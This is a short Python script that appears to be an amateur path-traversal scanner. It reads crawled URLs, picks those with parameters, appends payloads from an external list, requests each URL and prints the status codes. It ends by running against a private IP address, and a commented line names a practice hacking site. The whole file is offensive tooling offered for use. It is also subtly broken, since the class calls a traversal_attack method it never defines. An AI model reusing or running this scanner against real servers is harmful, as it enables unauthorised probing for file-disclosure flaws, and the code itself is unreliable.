from general import *
import re
import requests

class mainIdor:

    def __init__(self, url, prname):
        self.url = url
        self.prname = prname
        self.urlParm = list()

        self.listUrl = file_to_set(prname + "/crawled.txt")
        self.boot()

    def boot(self):
        #print(self.listUrl)
        for url in self.listUrl:
            cek = cek_link_with_parm(url)
            if cek is True:
                self.urlParm.append(url)
        for url in self.urlParm:
            self.traversal_attack(url)

def traversal_attack(link):
    linkBerhasil = list()
    list_attack = file_to_set("list_PaTrav_attack.txt")
    split = re.split("([^\?]+)(\?.*=)", link)
    for a in list_attack:
        cek = cek_link(link + a)
        print("response " + str(cek) + " : " + link + a)
    #for a in list_attack:
     #   cek = cek_link(split[1] + a)
      #  print(cek)
    #for a in list_attack:
     #   cek = cek_link(split[1] + split[2] + a)
      #  print(cek)

def cek_link(link):
    try:
        response = requests.get(link)
        code = response.status_code
        return code
    except Exception as e:
        return 404

#traversal_attack("http://testsite.com/get.php?f=list$g=coba")
#mainIdor('https://www.hackthissite.org', 'hack')
traversal_attack("http://192.168.10.7")